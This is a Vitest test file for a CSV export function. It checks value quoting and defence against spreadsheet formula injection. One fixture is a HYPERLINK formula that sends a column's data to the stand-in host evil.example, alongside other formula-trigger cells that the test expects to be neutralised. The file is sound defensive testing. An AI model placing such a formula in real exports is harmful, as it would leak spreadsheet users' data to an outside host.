import { afterEach, describe, expect, it, vi } from 'vitest';
import { exportToCsv } from '~/lib/export';

/** The text of the CSV file an export of these columns and rows downloads. */
async function csvText(columns: { key: string; name: string }[], rows: Record<string, unknown>[]) {
  let file: Blob | undefined;
  vi.stubGlobal('document', { createElement: () => ({ click: () => {} }) });
  vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
    file = blob as Blob;
    return 'blob:export';
  });
  vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {});
  exportToCsv(columns, rows, 'export.csv');
  return file ? file.text() : '';
}

describe('exportToCsv', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('keeps every value one cell: a comma, a quote or a line break is quoted with inner quotes doubled, a list joined', async () => {
    const columns = [
      { key: 'name', name: 'Name' },
      { key: 'message', name: 'Message' },
      { key: 'labels', name: 'Labels' },
    ];
    const rows = [
      { name: 'Plain', message: 'Say "hi"', labels: ['solo'] },
      { name: 'Smith, Jo', message: 'first line\nsecond line', labels: ['bug', 'ui'] },
    ];

    expect(await csvText(columns, rows)).toBe(
      ['Name,Message,Labels', 'Plain,"Say ""hi""",solo', '"Smith, Jo","first line\nsecond line","bug, ui"'].join('\n'),
    );
  });

  it('must not export a cell that a spreadsheet opens as a formula', async () => {
    const columns = [
      { key: 'name', name: 'Name' },
      { key: 'message', name: 'Message' },
    ];
    const rows = [
      { name: 'Ann', message: '=HYPERLINK("https://evil.example/?"&TEXTJOIN(",",1,C:C),"open")' },
      { name: '+1+1', message: '-1+1' },
      { name: '@SUM(A1:A2)', message: '\t=1+1' },
      { name: 'Bo', message: '\r=1+1' },
      // A number, a plain name and a missing value are written as they are
      { name: 'Jo Smith', message: -3 },
      { name: 'Cy' },
    ];

    expect(await csvText(columns, rows)).toBe(
      [
        'Name,Message',
        `Ann,"'=HYPERLINK(""https://evil.example/?""&TEXTJOIN("","",1,C:C),""open"")"`,
        "'+1+1,'-1+1",
        "'@SUM(A1:A2),'\t=1+1",
        `Bo,"'\r=1+1"`,
        'Jo Smith,-3',
        'Cy,-',
      ].join('\n'),
    );
  });
});
